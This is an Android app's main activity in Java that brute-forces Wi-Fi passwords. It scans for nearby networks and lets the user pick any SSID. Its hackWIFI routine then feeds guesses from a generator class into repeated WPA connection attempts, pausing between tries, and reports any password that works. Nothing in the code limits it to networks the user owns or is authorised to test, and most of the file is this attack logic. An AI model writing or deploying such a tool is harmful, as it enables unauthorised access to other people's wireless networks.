package com.dominik.wlancrawl;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.SeekBar;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;

import com.nispok.snackbar.Snackbar;

import java.util.ArrayList;
import java.util.List;

import static android.Manifest.permission.ACCESS_FINE_LOCATION;

public class MainActivity extends AppCompatActivity
{
    private static final int REQUEST_FINE_LOCATION = 0;

    private WifiManager wifi;
    private BroadcastReceiver wifiReciever;
    private String currentPas = "";
    private int waitTime = 4;

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // init wlan-manager
        wifi = (WifiManager) getSystemService(Context.WIFI_SERVICE);

        // enable Wifi
        if (!wifi.isWifiEnabled())
            wifi.setWifiEnabled(true);

        final TextView txtWaitTime = (TextView)findViewById(R.id.txtWaitTime);
        txtWaitTime.setText(getText(R.string.waittime) + " 4s");

        SeekBar seekBarWait = (SeekBar) findViewById(R.id.seekBar);
        seekBarWait.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener()
        {
            @Override
            public void onProgressChanged(SeekBar seekBar, int i, boolean b)
            {
                waitTime = i;
                txtWaitTime.setText(getText(R.string.waittime) + " " + Integer.toString(waitTime) + "s");
            }

            @Override
            public void onStartTrackingTouch(SeekBar seekBar) {}

            @Override
            public void onStopTrackingTouch(SeekBar seekBar) {}
        });

        Button btnFindWlan = (Button) findViewById(R.id.btnFindWlan);
        btnFindWlan.setOnClickListener(new View.OnClickListener()
        {
            @Override
            public void onClick(View view)
            {
                scan();
            }
        });

    }

    @Override
    public void onStop()
    {
        super.onStop();

        if (wifiReciever != null)
            unregisterReceiver(wifiReciever);
    }

    private void scan()
    {
        wifiReciever = new WifiScanReceiver();
        registerReceiver(wifiReciever, new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
        boolean scanStarted = wifi.startScan();

        if (scanStarted)
            Log.i("WIFI", "scan started successfully");
        else
            Log.i("WIFI", "scan did not start");
    }

    private boolean connect(String ssid, String key)
    {
        WifiConfiguration wc = new WifiConfiguration();
        wc.SSID = "\"".concat(ssid).concat("\"");
        wc.preSharedKey = "\"".concat(key).concat("\"");

//        CheckBox mSSIDHidden = (CheckBox) findViewById(R.id.wifiCBhiddenssid);
//        wc.hiddenSSID = false;
//        if (mSSIDHidden.isChecked()) {
//            wc.hiddenSSID = true;
//        }

        // TEST
        wc.hiddenSSID = true;
        // END TEST

        wc.status = WifiConfiguration.Status.ENABLED;
        wc.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);
        wc.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
        wc.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK);
        wc.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
        wc.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
        wc.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
        wc.allowedProtocols.set(WifiConfiguration.Protocol.WPA);

        int res = wifi.addNetwork(wc);
//        Log.d("WifiPreference", "add Network returned " + res);
        boolean b = wifi.enableNetwork(res, true);
//        Log.d("WifiPreference", "enableNetwork returned " + b);
        boolean c = wifi.reconnect();
//        Log.d("WifiPreference", "reconnect returned " + c);

        return (res != -1) && b && c;  // todo: how to recognise, when password was correct !?
    }

    private void hackWIFI(final boolean random, final String ssid)
    {
        final ProgressDialog dialog = new ProgressDialog(this);
        dialog.setCancelable(false);
        dialog.setCanceledOnTouchOutside(false);
        dialog.setIndeterminate(true);
        dialog.setMessage(String.format(getString(R.string.hacking), ssid, ""));
        dialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        dialog.show();

        Thread backgroundThread = new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                HackModul hackModul = new HackModul(random, ssid);

                boolean isConnected = false;

                while (hackModul.hasNext())
                {
                    currentPas = hackModul.next();

                    runOnUiThread(new Runnable()
                    {
                        @Override
                        public void run()
                        {
                            dialog.setMessage(String.format(getString(R.string.hacking), ssid, currentPas));
                        }
                    });

                    Log.i("WIFI", "try: " + currentPas);

                    if (MyReceiver.getIsConnected())
                    {
                        isConnected = true;

                        break;
                    }

                    connect(ssid, currentPas);
                    ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

                    try
                    {
                        Thread.sleep(waitTime * 1000);          // s -> ms
                    }
                    catch (InterruptedException e)
                    {
                        e.printStackTrace();
                    }
                }

                // show toast message, if hacking was not successful
                // not pretty to work twice on the UI-thread, but probably better then haven a new global var
                if (!isConnected)
                {
                    runOnUiThread(new Runnable()
                    {
                        @Override
                        public void run()
                        {
                            Toast.makeText(MainActivity.this, String.format(getString(R.string.no_pas_found), ssid), Toast.LENGTH_SHORT).show();
                        }
                    });
                }
                else
                {
                    runOnUiThread(new Runnable()
                    {
                        @Override
                        public void run()
                        {
                            Toast.makeText(MainActivity.this, getString(R.string.pas_found) + " " + currentPas, Toast.LENGTH_LONG).show();
                        }
                    });
                }

                // close the spinning box
                runOnUiThread(new Runnable()
                {
                    @Override
                    public void run()
                    {
                        dialog.dismiss();
                    }
                });
            }
        });
        backgroundThread.start();
    }

    private class WifiScanReceiver extends BroadcastReceiver
    {
        public void onReceive(Context c, Intent intent)
        {
            if (requestLocation())
                evaluateScan();
            // else: the request will reach the permission-request-receiver and he will call evaluateScan()

        }
    }

    private void evaluateScan()
    {
        List<ScanResult> scanResult = wifi.getScanResults();

        // build list and save results
        final List<String> wifiList = new ArrayList<String>();
        for (ScanResult result : scanResult)
        {
            wifiList.add(result.SSID);
        }

        ListView listWlan = (ListView) findViewById(R.id.listWifis);
        final ArrayAdapter<String> adapter = new ArrayAdapter<String>(MainActivity.this, android.R.layout.simple_list_item_1, wifiList);

        listWlan.setAdapter(adapter);

        listWlan.setOnItemClickListener(new AdapterView.OnItemClickListener()
        {
            @Override
            public void onItemClick(AdapterView<?> parent, final View view, int position, long id)
            {
                final String item = (String) parent.getItemAtPosition(position);

                // collect infos:
                Switch swtch = (Switch)findViewById(R.id.switchRandom);
                boolean random = swtch.isChecked();

                hackWIFI(random, item);
            }
        });
    }

    private boolean requestLocation()
    {
        // just continue, if os is Android M or newer
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M)
        {
            return true;
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
        {
            // Should we show an explanation?
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.ACCESS_FINE_LOCATION))
            {

                // Show an explanation to the user *asynchronously* -- don't block
                // this thread waiting for the user's response! After the user
                // sees the explanation, try again to request the permission.
                Toast.makeText(this, getString(R.string.explain_permission), Toast.LENGTH_SHORT).show();
            }
            else
            {
                // No explanation needed, we can request the permission.
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_FINE_LOCATION);
            }
        }

        return false;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults)
    {
        switch (requestCode)
        {
            case REQUEST_FINE_LOCATION:
            {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
                {
                    evaluateScan();
                }
                else
                {
                    Toast.makeText(this, getString(R.string.permission_denied), Toast.LENGTH_SHORT).show();
                }
            }
        }
    }
}
